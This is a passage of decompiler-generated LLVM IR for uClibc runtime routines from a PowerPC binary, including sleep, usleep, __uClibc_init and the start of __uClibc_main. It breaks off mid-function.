  store i32 %v2_1000bd0c, i32* %r0.global-to-local, align 4
  store i32 %v2_1000bd0c, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1000bdc0

dec_label_pc_1000bdc0:                            ; preds = %dec_label_pc_1000bdf4.dec_label_pc_1000bdc0_crit_edge, %dec_label_pc_1000bd7c
  %v0_1000bdc4 = phi i32 [ %v1_1000bd9c, %dec_label_pc_1000bd7c ], [ %v0_1000bdc4.pre, %dec_label_pc_1000bdf4.dec_label_pc_1000bdc0_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1000bd14, %dec_label_pc_1000bd7c ], [ %stack_var_-52.3, %dec_label_pc_1000bdf4.dec_label_pc_1000bdc0_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000bdac, %dec_label_pc_1000bd7c ], [ %stack_var_-56.3, %dec_label_pc_1000bdf4.dec_label_pc_1000bdc0_crit_edge ]
  %v1_1000bdc4 = add i32 %v0_1000bdc4, 4
  store i32 %v1_1000bdc4, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1000bde8, label %dec_label_pc_1000bdd8

dec_label_pc_1000bdd8:                            ; preds = %dec_label_pc_1000bdc0
  %v4_1000bdc0 = zext i8 %stack_var_-56.2 to i32
  %v1_1000bdd0 = add i8 %stack_var_-56.2, 1
  %v1_1000bdcc = mul nuw nsw i32 %v4_1000bdc0, 4
  %v3_1000bdd8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1000bdd8, i32* %r0.global-to-local, align 4
  %v2_1000bde0 = add i32 %v3_1000bdd8, %v1_1000bdcc
  br label %dec_label_pc_1000bdf4

dec_label_pc_1000bde8:                            ; preds = %dec_label_pc_1000bdc0
  %v1_1000bdec = add i32 %stack_var_-52.2, 4
  store i32 %v1_1000bdec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000bdf4

dec_label_pc_1000bdf4:                            ; preds = %dec_label_pc_1000bdd8, %dec_label_pc_1000bde8
  %stack_var_-52.3 = phi i32 [ %v1_1000bdec, %dec_label_pc_1000bde8 ], [ %stack_var_-52.2, %dec_label_pc_1000bdd8 ]
  %v0_1000bdf4 = phi i32 [ %stack_var_-52.2, %dec_label_pc_1000bde8 ], [ %v2_1000bde0, %dec_label_pc_1000bdd8 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1000bde8 ], [ %v1_1000bdd0, %dec_label_pc_1000bdd8 ]
  %v1_1000bdf4 = inttoptr i32 %v0_1000bdf4 to i32*
  %v2_1000bdf4 = load i32, i32* %v1_1000bdf4, align 4
  store i32 %v2_1000bdf4, i32* %r0.global-to-local, align 4
  %v2_1000bdf8 = inttoptr i32 %v1_1000bdc4 to i32*
  store i32 %v2_1000bdf4, i32* %v2_1000bdf8, align 4
  %v0_1000bdfc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bdfc = add i32 %v0_1000bdfc, -1
  store i32 %v1_1000bdfc, i32* %ctr.global-to-local, align 4
  %v2_1000bdfc = icmp eq i32 %v1_1000bdfc, 0
  br i1 %v2_1000bdfc, label %dec_label_pc_1000be00, label %dec_label_pc_1000bdf4.dec_label_pc_1000bdc0_crit_edge

dec_label_pc_1000bdf4.dec_label_pc_1000bdc0_crit_edge: ; preds = %dec_label_pc_1000bdf4
  %v0_1000bdc4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000bdc0

dec_label_pc_1000be00:                            ; preds = %dec_label_pc_1000bdf4
  %v3_1000be04 = load i32, i32* @global_var_10024a6c.632, align 4
  store i32 268484108, i32* @lr, align 4
  %v2_1000be08 = call i32 @__GI_execve(i32 %v3_1000be04, i32 268566528)
  %v0_1000be0c = load i32, i32* @r1, align 4
  %v1_1000be0c = inttoptr i32 %v0_1000be0c to i32*
  %v2_1000be0c = load i32, i32* %v1_1000be0c, align 4
  store i32 %v2_1000be0c, i32* %r11.global-to-local, align 4
  %v1_1000be10 = add i32 %v2_1000be0c, 4
  %v2_1000be10 = inttoptr i32 %v1_1000be10 to i32*
  %v3_1000be10 = load i32, i32* %v2_1000be10, align 4
  store i32 %v3_1000be10, i32* %r0.global-to-local, align 4
  ret i32 %v2_1000be08

; uselistorder directives
  uselistorder i32 %v1_1000bdfc, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000bd4c, { 1, 0 }
  uselistorder i32 %v1_1000bd44, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000bd0c, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 4, 5 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder i8 1, { 0, 1, 2, 3, 11, 10, 12, 9, 8, 7, 6, 5, 4, 13 }
  uselistorder label %dec_label_pc_1000bdf4, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd70, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000be24 = icmp eq i32 %arg1, 0
  br i1 %v3_1000be24, label %dec_label_pc_1000bfd8, label %dec_label_pc_1000be54.lr.ph

dec_label_pc_1000be54.lr.ph:                      ; preds = %entry
  %v2_1000be48 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000be48, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000be5442 = add i32 %v2_1000be48, 132
  %v3_1000be5443 = inttoptr i32 %v2_1000be5442 to i32*
  store i32 0, i32* %v3_1000be5443, align 4
  %v0_1000be5844 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000be5845 = add i32 %v0_1000be5844, -1
  store i32 %v1_1000be5845, i32* %r11.global-to-local, align 4
  %v1_1000be5c46 = mul i32 %v1_1000be5845, 4
  %v1_1000be6047 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000be6048 = add i32 %v1_1000be6047, %v1_1000be5c46
  %v0_1000be6449 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000be6450 = add i32 %v0_1000be6449, -1
  store i32 %v1_1000be6450, i32* %ctr.global-to-local, align 4
  %v2_1000be6451 = icmp eq i32 %v1_1000be6450, 0
  br i1 %v2_1000be6451, label %dec_label_pc_1000be68, label %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge

dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge: ; preds = %dec_label_pc_1000be54.lr.ph, %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge
  %v2_1000be6052 = phi i32 [ %v2_1000be60, %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge ], [ %v2_1000be6048, %dec_label_pc_1000be54.lr.ph ]
  %v0_1000be54.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000be54 = add i32 %v2_1000be6052, 8
  %v3_1000be54 = inttoptr i32 %v2_1000be54 to i32*
  store i32 %v0_1000be54.pre, i32* %v3_1000be54, align 4
  %v0_1000be58 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000be58 = add i32 %v0_1000be58, -1
  store i32 %v1_1000be58, i32* %r11.global-to-local, align 4
  %v1_1000be5c = mul i32 %v1_1000be58, 4
  %v1_1000be60 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000be60 = add i32 %v1_1000be60, %v1_1000be5c
  %v0_1000be64 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000be64 = add i32 %v0_1000be64, -1
  store i32 %v1_1000be64, i32* %ctr.global-to-local, align 4
  %v2_1000be64 = icmp eq i32 %v1_1000be64, 0
  br i1 %v2_1000be64, label %dec_label_pc_1000be68, label %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge

dec_label_pc_1000be68:                            ; preds = %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge, %dec_label_pc_1000be54.lr.ph
  %v0_1000be7c.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_1000be68 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000be68, i32* %r29.global-to-local, align 4
  store i32 %v2_1000be68, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000be7c.pre, i32* %stack_var_-440, align 4
  %v0_1000be80 = call i32 @__sigaddset()
  store i32 %v0_1000be80, i32* %r3.global-to-local, align 4
  %v1_1000be84 = icmp slt i32 %v0_1000be80, 0
  br i1 %v1_1000be84, label %dec_label_pc_1000bfe0, label %dec_label_pc_1000be8c

dec_label_pc_1000be8c:                            ; preds = %dec_label_pc_1000be68
  %v2_1000be8c = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268484256, i32* @lr, align 4
  %v3_1000be9c = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1000be68, i32 %v2_1000be8c)
  store i32 %v3_1000be9c, i32* %r3.global-to-local, align 4
  %v3_1000bea0 = icmp eq i32 %v3_1000be9c, 0
  br i1 %v3_1000bea0, label %dec_label_pc_1000bea8, label %dec_label_pc_1000bfe0

dec_label_pc_1000bea8:                            ; preds = %dec_label_pc_1000be8c
  store i32 %v2_1000be8c, i32* %r3.global-to-local, align 4
  %v2_1000beb0 = call i32 @__sigismember(i32 %v2_1000be8c, i32 17)
  store i32 %v2_1000beb0, i32* %r3.global-to-local, align 4
  %v3_1000beb4 = icmp eq i32 %v2_1000beb0, 0
  br i1 %v3_1000beb4, label %dec_label_pc_1000bed4.lr.ph, label %dec_label_pc_1000bfa0

dec_label_pc_1000bed4.lr.ph:                      ; preds = %dec_label_pc_1000bea8
  store i32 %v2_1000be48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000be5443, align 4
  %v0_1000bed833 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bed834 = add i32 %v0_1000bed833, -1
  store i32 %v1_1000bed834, i32* %r11.global-to-local, align 4
  %v1_1000bedc35 = mul i32 %v1_1000bed834, 4
  %v1_1000bee036 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bee037 = add i32 %v1_1000bee036, %v1_1000bedc35
  %v0_1000bee438 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bee439 = add i32 %v0_1000bee438, -1
  store i32 %v1_1000bee439, i32* %ctr.global-to-local, align 4
  %v2_1000bee440 = icmp eq i32 %v1_1000bee439, 0
  br i1 %v2_1000bee440, label %dec_label_pc_1000bee8, label %dec_label_pc_1000bed4.dec_label_pc_1000bed4_crit_edge

dec_label_pc_1000bed4.dec_label_pc_1000bed4_crit_edge: ; preds = %dec_label_pc_1000bed4.lr.ph, %dec_label_pc_1000bed4.dec_label_pc_1000bed4_crit_edge
  %v2_1000bee041 = phi i32 [ %v2_1000bee0, %dec_label_pc_1000bed4.dec_label_pc_1000bed4_crit_edge ], [ %v2_1000bee037, %dec_label_pc_1000bed4.lr.ph ]
  %v0_1000bed4.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000bed4 = add i32 %v2_1000bee041, 8
  %v3_1000bed4 = inttoptr i32 %v2_1000bed4 to i32*
  store i32 %v0_1000bed4.pre, i32* %v3_1000bed4, align 4
  %v0_1000bed8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bed8 = add i32 %v0_1000bed8, -1
  store i32 %v1_1000bed8, i32* %r11.global-to-local, align 4
  %v1_1000bedc = mul i32 %v1_1000bed8, 4
  %v1_1000bee0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bee0 = add i32 %v1_1000bee0, %v1_1000bedc
  %v0_1000bee4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bee4 = add i32 %v0_1000bee4, -1
  store i32 %v1_1000bee4, i32* %ctr.global-to-local, align 4
  %v2_1000bee4 = icmp eq i32 %v1_1000bee4, 0
  br i1 %v2_1000bee4, label %dec_label_pc_1000bee8, label %dec_label_pc_1000bed4.dec_label_pc_1000bed4_crit_edge

dec_label_pc_1000bee8:                            ; preds = %dec_label_pc_1000bed4.dec_label_pc_1000bed4_crit_edge, %dec_label_pc_1000bed4.lr.ph
  store i32 %v2_1000be68, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000bef0 = call i32 @__sigaddset()
  store i32 %v0_1000bef0, i32* %r3.global-to-local, align 4
  %v1_1000bef4 = icmp slt i32 %v0_1000bef0, 0
  br i1 %v1_1000bef4, label %dec_label_pc_1000bfe0, label %dec_label_pc_1000befc

dec_label_pc_1000befc:                            ; preds = %dec_label_pc_1000bee8
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000bf04 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268484364, i32* @lr, align 4
  %v4_1000bf08 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_1000bf04)
  store i32 %v4_1000bf08, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000bf08, -1
  br i1 %tmp30, label %dec_label_pc_1000bf3c, label %dec_label_pc_1000bf14

dec_label_pc_1000bf14:                            ; preds = %dec_label_pc_1000befc
  %v0_1000bf14 = call i32 @__errno_location()
  store i32 %v0_1000bf14, i32* %r3.global-to-local, align 4
  %v1_1000bf1c = inttoptr i32 %v0_1000bf14 to i32*
  %v2_1000bf1c = load i32, i32* %v1_1000bf1c, align 4
  store i32 %v0_1000bf14, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268484400, i32* @lr, align 4
  %v3_1000bf2c = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000be8c, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000bf34 = inttoptr i32 %v0_1000bf14 to i32*
  store i32 %v2_1000bf1c, i32* %v2_1000bf34, align 4
  %v0_1000bff4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bfe4

dec_label_pc_1000bf3c:                            ; preds = %dec_label_pc_1000befc
  %v3_1000bf3c = load i32, i32* %stack_var_-176, align 4
  %v3_1000bf48 = icmp eq i32 %v3_1000bf3c, 1
  br i1 %v3_1000bf48, label %dec_label_pc_1000bf50, label %dec_label_pc_1000bf84

dec_label_pc_1000bf50:                            ; preds = %dec_label_pc_1000bf3c
  store i32 %v2_1000be48, i32* %r3.global-to-local, align 4
  store i32 268484444, i32* @lr, align 4
  %v2_1000bf58 = call i32 @__libc_nanosleep(i32 %v2_1000be48, i32 %v2_1000be48)
  store i32 %v2_1000bf58, i32* %r3.global-to-local, align 4
  store i32 %v2_1000bf58, i32* @r31, align 4
  %v0_1000bf60 = call i32 @__errno_location()
  store i32 %v0_1000bf60, i32* %r3.global-to-local, align 4
  store i32 %v0_1000bf60, i32* %r29.global-to-local, align 4
  %v1_1000bf70 = inttoptr i32 %v0_1000bf60 to i32*
  %v2_1000bf70 = load i32, i32* %v1_1000bf70, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268484476, i32* @lr, align 4
  %v3_1000bf78 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000be8c, i32 0)
  store i32 %v3_1000bf78, i32* %r3.global-to-local, align 4
  %v1_1000bf7c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000bf7c = inttoptr i32 %v1_1000bf7c to i32*
  store i32 %v2_1000bf70, i32* %v2_1000bf7c, align 4
  %v0_1000bfac.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bfac

dec_label_pc_1000bf84:                            ; preds = %dec_label_pc_1000bf3c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268484500, i32* @lr, align 4
  %v3_1000bf90 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000be8c, i32 0)
  br label %dec_label_pc_1000bfa0

dec_label_pc_1000bfa0:                            ; preds = %dec_label_pc_1000bea8, %dec_label_pc_1000bf84
  store i32 %v2_1000be48, i32* %r3.global-to-local, align 4
  store i32 268484520, i32* @lr, align 4
  %v2_1000bfa4 = call i32 @__libc_nanosleep(i32 %v2_1000be48, i32 %v2_1000be48)
  store i32 %v2_1000bfa4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bfac

dec_label_pc_1000bfac:                            ; preds = %dec_label_pc_1000bf50, %dec_label_pc_1000bfa0
  %v0_1000bfac = phi i32 [ %v0_1000bfac.pr, %dec_label_pc_1000bf50 ], [ %v2_1000bfa4, %dec_label_pc_1000bfa0 ]
  %v3_1000bfac = icmp eq i32 %v0_1000bfac, 0
  br i1 %v3_1000bfac, label %dec_label_pc_1000bfd8, label %dec_label_pc_1000bfb4

dec_label_pc_1000bfb4:                            ; preds = %dec_label_pc_1000bfac
  %v3_1000bfc4 = load i32, i32* %stack_var_-440, align 4
  %v0_1000bfc8 = call i32 @__asm_mfcr()
  store i32 %v0_1000bfc8, i32* %r3.global-to-local, align 4
  %v1_1000bfcc = call i32 @__asm_rlwinm(i32 %v0_1000bfc8, i32 30, i32 31, i32 31)
  %v2_1000bfd0 = add i32 %v3_1000bfc4, %v1_1000bfcc
  store i32 %v2_1000bfd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bfe4

dec_label_pc_1000bfd8:                            ; preds = %dec_label_pc_1000bfac, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bfe4

dec_label_pc_1000bfe0:                            ; preds = %dec_label_pc_1000be8c, %dec_label_pc_1000bee8, %dec_label_pc_1000be68
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bfe4

dec_label_pc_1000bfe4:                            ; preds = %dec_label_pc_1000bfd8, %dec_label_pc_1000bfb4, %dec_label_pc_1000bf14, %dec_label_pc_1000bfe0
  %v0_1000bff4 = phi i32 [ 0, %dec_label_pc_1000bfd8 ], [ %v2_1000bfd0, %dec_label_pc_1000bfb4 ], [ %v0_1000bff4.pre, %dec_label_pc_1000bf14 ], [ -1, %dec_label_pc_1000bfe0 ]
  ret i32 %v0_1000bff4

; uselistorder directives
  uselistorder i32 %v1_1000bee4, { 1, 0 }
  uselistorder i32 %v2_1000be8c, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_1000be64, { 1, 0 }
  uselistorder i32 %v2_1000be48, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 2, 6, 1, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_1000bfe4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bfe0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bfac, { 1, 0 }
  uselistorder label %dec_label_pc_1000bfa0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bed4.dec_label_pc_1000bed4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000be54.dec_label_pc_1000be54_crit_edge, { 1, 0 }
}

define i32 @usleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000c014 = udiv i32 %arg1, 1000000
  %v2_1000c018 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c014, i32* %stack_var_-24, align 4
  store i32 268484660, i32* @lr, align 4
  %v2_1000c030 = call i32 @__libc_nanosleep(i32 %v2_1000c018, i32 0)
  ret i32 %v2_1000c030

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 0, 2, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c094:
  %v3_1000c098 = load i32, i32* @global_var_10024a74.634, align 4
  %v3_1000c09c = icmp eq i32 %v3_1000c098, 0
  br i1 %v3_1000c09c, label %dec_label_pc_1000c0ac, label %dec_label_pc_1000c0a4

dec_label_pc_1000c0a4:                            ; preds = %dec_label_pc_1000c094
  %v2_1000c0a8 = load i32, i32* @r4, align 4
  %v3_1000c0a8 = call i32 @unknown_0(i32 268566528, i32 %v2_1000c0a8)
  store i32 %v3_1000c0a8, i32* @r3, align 4
  br label %dec_label_pc_1000c0ac

dec_label_pc_1000c0ac:                            ; preds = %dec_label_pc_1000c094, %dec_label_pc_1000c0a4
  %v3_1000c0b0 = load i32, i32* @global_var_10024a78.635, align 4
  %v3_1000c0b4 = icmp eq i32 %v3_1000c0b0, 0
  br i1 %v3_1000c0b4, label %dec_label_pc_1000c0ac.dec_label_pc_1000c0c4_crit_edge, label %dec_label_pc_1000c0bc

dec_label_pc_1000c0ac.dec_label_pc_1000c0c4_crit_edge: ; preds = %dec_label_pc_1000c0ac
  %v0_1000c0d4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c0c4

dec_label_pc_1000c0bc:                            ; preds = %dec_label_pc_1000c0ac
  %v2_1000c0c0 = load i32, i32* @r4, align 4
  %v3_1000c0c0 = call i32 @unknown_0(i32 268566528, i32 %v2_1000c0c0)
  br label %dec_label_pc_1000c0c4

dec_label_pc_1000c0c4:                            ; preds = %dec_label_pc_1000c0ac.dec_label_pc_1000c0c4_crit_edge, %dec_label_pc_1000c0bc
  %v0_1000c0d4 = phi i32 [ %v0_1000c0d4.pre, %dec_label_pc_1000c0ac.dec_label_pc_1000c0c4_crit_edge ], [ %v3_1000c0c0, %dec_label_pc_1000c0bc ]
  ret i32 %v0_1000c0d4

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c0c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0ac, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_1000c0e0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000c0e0
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268484872, i32* @lr, align 4
  %v2_1000c104 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_1000c108 = icmp eq i32 %v2_1000c104, -1
  br i1 %v3_1000c108, label %dec_label_pc_1000c110, label %dec_label_pc_1000c130

dec_label_pc_1000c110:                            ; preds = %entry
  %v0_1000c114 = load i32, i32* @r30, align 4
  store i32 268484900, i32* @lr, align 4
  %v3_1000c120 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1001351c.636 to i32), i32 %v0_1000c114)
  %v1_1000c124 = load i32, i32* @r31, align 4
  %v4_1000c124 = icmp eq i32 %v3_1000c120, %v1_1000c124
  br i1 %v4_1000c124, label %dec_label_pc_1000c130, label %dec_label_pc_1000c12c

dec_label_pc_1000c12c:                            ; preds = %dec_label_pc_1000c110
  %v1_1000c12c = call i32 @abort(i32 %v3_1000c120)
  br label %dec_label_pc_1000c130

dec_label_pc_1000c130:                            ; preds = %entry, %dec_label_pc_1000c110, %dec_label_pc_1000c12c
  %v0_1000c140 = phi i32 [ %v2_1000c104, %entry ], [ %v3_1000c120, %dec_label_pc_1000c110 ], [ %v1_1000c12c, %dec_label_pc_1000c12c ]
  ret i32 %v0_1000c140

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_open, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000c130, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000c164 = load i32, i32* @global_var_10024a7c.637, align 4
  %v3_1000c168 = icmp eq i32 %v3_1000c164, 0
  br i1 %v3_1000c168, label %dec_label_pc_1000c18c, label %dec_label_pc_1000c1b0

dec_label_pc_1000c18c:                            ; preds = %entry
  store i32 1, i32* @global_var_10024a7c.637, align 4
  store i32 4096, i32* @global_var_10024a70.553, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 -31504), i32 0), label %dec_label_pc_1000c1b0, label %dec_label_pc_1000c19c

dec_label_pc_1000c19c:                            ; preds = %dec_label_pc_1000c18c
  %v1_1000c1ac = call i32 @_stdio_init(i32 add (i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 -31504))
  store i32 %v1_1000c1ac, i32* @r3, align 4
  br label %dec_label_pc_1000c1b0

dec_label_pc_1000c1b0:                            ; preds = %entry, %dec_label_pc_1000c18c, %dec_label_pc_1000c19c
  %v0_1000c1c0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000c1c0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c1b0, { 2, 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000c1dc = mul i32 %arg2, 4
  %v2_1000c1e0 = add i32 %tmp, %v1_1000c1dc
  %v0_1000c1e4 = load i32, i32* @r9, align 4
  store i32 %v0_1000c1e4, i32* @global_var_10024a68.638, align 4
  %v1_1000c1e8 = add i32 %v2_1000c1e0, 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 %v1_1000c1e8, i32* @global_var_10024a6c.632, align 4
  store i32 %arg6, i32* @global_var_10024a78.635, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_1000c208 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_1000c210 = icmp eq i32 %v1_1000c1e8, %v2_1000c208
  br i1 %v4_1000c210, label %dec_label_pc_1000c218, label %dec_label_pc_1000c21c

dec_label_pc_1000c218:                            ; preds = %entry
  store i32 %v2_1000c1e0, i32* @global_var_10024a6c.632, align 4
  br label %dec_label_pc_1000c21c

dec_label_pc_1000c21c:                            ; preds = %entry, %dec_label_pc_1000c218
  %v2_1000c21c = ptrtoint i32* %stack_var_-168 to i32
  store i32 268485164, i32* @lr, align 4
  %v3_1000c228 = call i32 @__GI_memset(i32 %v2_1000c21c, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_10024a6c.632, align 4
  br label %dec_label_pc_1000c238

dec_label_pc_1000c238:                            ; preds = %dec_label_pc_1000c238, %dec_label_pc_1000c21c
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1000c21c ], [ %v1_1000c23c, %dec_label_pc_1000c238 ]
  %v1_1000c238 = inttoptr i32 %storemerge to i32*
  %v2_1000c238 = load i32, i32* %v1_1000c238, align 4
  %v1_1000c23c = add i32 %storemerge, 4
  %v3_1000c240 = icmp eq i32 %v2_1000c238, 0
  br i1 %v3_1000c240, label %dec_label_pc_1000c248, label %dec_label_pc_1000c238

dec_label_pc_1000c248:                            ; preds = %dec_label_pc_1000c238
  store i32 %v1_1000c23c, i32* %r29.global-to-local, align 4
  %v1_1000c27412 = inttoptr i32 %v1_1000c23c to i32*
  %v2_1000c27413 = load i32, i32* %v1_1000c27412, align 4
  %v3_1000c27816 = icmp eq i32 %v2_1000c27413, 0
  br i1 %v3_1000c27816, label %dec_label_pc_1000c280, label %dec_label_pc_1000c250

dec_label_pc_1000c250:                            ; preds = %dec_label_pc_1000c248, %dec_label_pc_1000c270
  %v0_1000c264 = phi i32 [ %v1_1000c270, %dec_label_pc_1000c270 ], [ %v1_1000c23c, %dec_label_pc_1000c248 ]
  %v0_1000c258 = phi i32 [ %v2_1000c274, %dec_label_pc_1000c270 ], [ %v2_1000c27413, %dec_label_pc_1000c248 ]
  %v2_1000c250 = icmp ugt i32 %v0_1000c258, 14
  br i1 %v2_1000c250, label %dec_label_pc_1000c270, label %dec_label_pc_1000c258

dec_label_pc_1000c258:                            ; preds = %dec_label_pc_1000c250
  %v1_1000c258 = mul i32 %v0_1000c258, 8
  %v2_1000c260 = add i32 %v1_1000c258, %v2_1000c21c
